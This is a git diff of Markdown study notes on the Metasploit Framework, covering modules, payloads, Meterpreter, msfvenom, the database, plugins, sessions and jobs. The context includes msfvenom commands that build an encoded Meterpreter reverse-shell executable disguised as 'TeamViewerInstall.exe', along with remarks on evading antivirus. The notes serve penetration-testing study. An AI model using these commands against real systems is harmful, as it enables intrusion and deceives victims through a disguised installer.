@@ -78,9 +78,9 @@ ls /usr/share/metasploit-framework/tools/
 <details>
 <summary><h3>Modules</h3></summary>
 
-Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.  
+Metasploit modules are pre-built scripts designed for specific tasks, each with corresponding functions that have been thoroughly developed and tested in real-world scenarios.
 
-Once we are in the msfconsole, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:  
+Within the msfconsole, users can choose from a comprehensive collection of available Metasploit modules. These modules are organized into folders, displayed in the following structure:
 
 **Syntax**  
 
@@ -103,10 +103,9 @@ The No. tag will be displayed to select the exploit we want afterward during our
 
 **Type**
 
-The `Type` tag is the first level of segregation between the Metasploit modules. Looking at this field, we can tell what the piece of code for this module will accomplish. Some types are not directly usable like an exploit module but are present for structural and modular purposes.
+The **Type** tag categorizes Metasploit modules at the highest level. By examining this field, we can determine the module’s intended function. Some types—such as exploit modules—are not directly executable but exist for structural and organizational purposes.
 
-Below is a unified table with all possible module types, their descriptions, and whether they can be used directly as interactable modules (i.e., with `use <no.>`).
-
+The table below consolidates all possible module types, their descriptions, and indicates whether they can be directly interacted with (e.g., via **use <no.>**).
 
 | Type      | Description                                                                                   | Interactable |
 |-----------|-----------------------------------------------------------------------------------------------|--------------|
@@ -120,15 +119,15 @@ Below is a unified table with all possible module types, their descriptions, and
 
 **OS**  
 
-The OS tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.
+The OS tag indicates the target operating system and architecture for which the module was designed. Since different operating systems require distinct code execution methods, this tag ensures compatibility with the intended environment.
 
 **Service**  
 
-The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the auxiliary or post ones, this tag can refer to a more general activity such as gather, referring to the gathering of credentials, for example.
+The Service tag identifies the vulnerable service running on the target machine. However, for certain modules (e.g., auxiliary or post), this tag may represent a broader action—such as _gather_—which refers to activities like credential collection.
 
-**Service**
+**Name**
 
-Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.
+The Name tag describes the module's core function—the specific action it performs for its intended purpose.
 
 </details>
 
@@ -276,7 +275,7 @@ The table below contains the most common payloads used for Windows machines and 
 <details>
 <summary><h3>Targets</h3></summary>
 
-Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.
+The **Target** field specifies particular operating system versions that the exploit module has been adapted to work with. These unique OS identifiers allow the module to customize its execution for specific system versions.
 
 **Show Targets**  
 
@@ -319,7 +318,7 @@ msf6 > set target 6
 <details>
 <summary><h3>Payloads</h3></summary>
 
-A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages.
+In Metasploit, a payload is a module that enables successful exploitation, typically by establishing a shell session for the attacker. 
 
 **Show all payloads**
 
@@ -327,21 +326,24 @@ A Payload in Metasploit refers to a module that aids the exploit module in (typi
 msf6 > show payloads
 ```
 
+The framework provides three distinct payload types:
+
+
 <details>
-<summary><h4>Singles</h4></summary>
+<summary><h4>1. Singles</h4></summary>
 
 A _Single_ payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.
 </details>
 
 <details>
-<summary><h4>Stagers</h4></summary>
+<summary><h4>2. Stagers</h4></summary>
 
 _Stager_ payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.  
 
 </details>
 
 <details>
-<summary><h4>Stages</h4></summary>
+<summary><h4>3. Stages</h4></summary>
 
 _Stages_ are payload components that are downloaded by stager's modules.  
 
@@ -359,13 +361,31 @@ Payload stages automatically use middle stagers:
 <details>
 <summary><h3>Staged Payloads</h3></summary>
 
-A staged payload is, simply put, an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together.  
+A staged payload modularizes the exploitation process by separating functionality into discrete components. Each stage performs specific tasks while chaining together to execute the complete attack.
 
-The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (AV) / Intrusion Prevention System (IPS) evasion as much as possible.
+Like all payloads, its objectives are twofold:
 
-Reverse connections **(stage0)** are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a security trust zone.
+1. Establish shell access on the target system
 
-After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access **(stage1)**.
+2. Maintain minimal footprint to evade AV/IPS detection
+
+**Connection Methodology:**
+
+* Stage 0 (Reverse Connection):
+
+    * The victim host initiates contact back to the attacker
+
+    * Lower detection risk as the connection originates from within the target's security trust zone
+
+    * Establishes initial communication channel
+
+* Stage 1 (Shell Access):
+
+    * After stable connection is established
+
+    * Attacker delivers the larger, more functional payload component
+
+    * Typically provides full shell access and control
 
 <details>
 <summary><h4>Meterpreter Payload</h4></summary>
@@ -378,13 +398,6 @@ The Meterpreter payload is a specific type of multi-faceted payload that:
 - Resides **entirely in memory**, leaving **no traces on the hard drive**.
 - Evades many **traditional forensic detection techniques**.
 - Allows **dynamic loading and unloading of scripts and plugins** during runtime.
-
-</details>
-
-<details>
-<summary><h4>Searching for Specific Payload</h4></summary>
-
-
 
 </details>
 
@@ -427,14 +440,22 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATT
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
 ```  
 
-As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion.
+As anticipated, most commercial antivirus solutions can detect these payloads during real-world engagements. Therefore, additional evasion techniques become necessary to bypass modern endpoint protection systems.
 
 </details>
 
 <details>
 <summary><h3>Databases</h3></summary>
 
-Databases in msfconsole are used to keep track of your results. Msfconsole has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools.
+The Metasploit Framework utilizes databases within msfconsole to systematically store and manage penetration testing results. The system features native PostgreSQL integration, providing:
+
+**Key Benefits:**
+
+* Instant access to scan results and historical data
+
+* Efficient data management through direct database interaction
+
+* Seamless import/export functionality for integration with external tools
 
 <details>
 <summary><h4>Setting up the Database</h4></summary>
@@ -468,7 +489,7 @@ sudo msfdb status
 sudo msfdb run
 ``` 
 
-If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
+If your database is already configured but you're unable to modify the MSF user password, use the following command sequence:
 
 **MSF - Reinitiate the Database**
 
@@ -519,7 +540,13 @@ msf6 > db_export -f xml backup.xml
 <details>
 <summary><h3>Plugins</h3></summary>
 
-Plugins work directly with the API and can be used to manipulate the entire framework. They can be useful for automating repetitive tasks, adding new commands to the msfconsole, and extending the already powerful framework.
+Metasploit plugins interact directly with the framework’s API, enabling deep integration and control. They serve three primary purposes:
+
+* Automation – Streamline repetitive tasks
+
+* Extensibility – Add custom commands to msfconsole
+
+* Enhancement – Expand the framework’s built-in capabilities
 
 **Listing plugins**  
 
@@ -563,12 +590,97 @@ msf6 > help
 <details>
 <summary><h2>🤝 MFS Sessions</h2></summary>
 
-Text
+<details>
+<summary><h3>Sessions</h3></summary>
+
+**Multi-Session Management in MSFconsole**
+
+MSFconsole supports concurrent management of multiple modules and sessions. Key capabilities include:
+
+1. Session Switching – Seamlessly transition between active sessions
+
+2. Module Linking – Attach new modules to backgrounded sessions
+
+3. Job Conversion – Convert sessions into persistent background jobs
+
+**Important Notes:**
+
+* Backgrounded sessions maintain active connections to target hosts
+
+* Sessions may terminate unexpectedly due to:
+
+    * Payload execution failures
+
+    * Communication channel disruptions
+
+**Backgrounding Sessions in MSFconsole**  
+
+Active sessions can be backgrounded when they maintain communication with the target host. This allows operators to:
+
+* Preserve established connections
+
+* Switch between multiple engagements
+
+* Deploy additional modules without session interruption
+
+**Backgrounding Methods:**
+
+1. Keyboard Shortcut: CTRL+Z (Universal)
+
+2. Meterpreter Command: background (Meterpreter-specific)
+
+**Process Flow:**
+
+1. Initiate background request
+
+2. Confirm action via prompt
+
+3. Return to msf6 > console
+
+4. Immediately deploy new modules
+
+**Listing Active Sessions**
+
+```bash
+msf6 exploit(windows/smb/psexec_psh) > sessions
+```  
+
+**Interacting with a Session**
+
+```bash
+msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
+``` 
+
+</details>
 
 <details>
-<summary><h3>Sessions & Jobs</h3></summary>
+<summary><h3>Jobs</h3></summary>
 
-Text
+When an active exploit occupies a port needed for another module, improper termination (e.g., CTRL+C) leaves the port bound. Instead, follow this procedure:
+
+**1. Check Active Jobs**
+
+```bash
+msf6 > jobs -l
+``` 
+
+**2. Terminate Conflicts**
+
+```bash
+msf6 > jobs -k <ID>
+``` 
+
+**Jobs Command Help Menu**  
+
+```bash
+msf6 > jobs -h
+``` 
+
+**Running an Exploit as a Background Job**  
+
+```bash
+msf6 > exploit -j
+``` 
 
 </details>
 
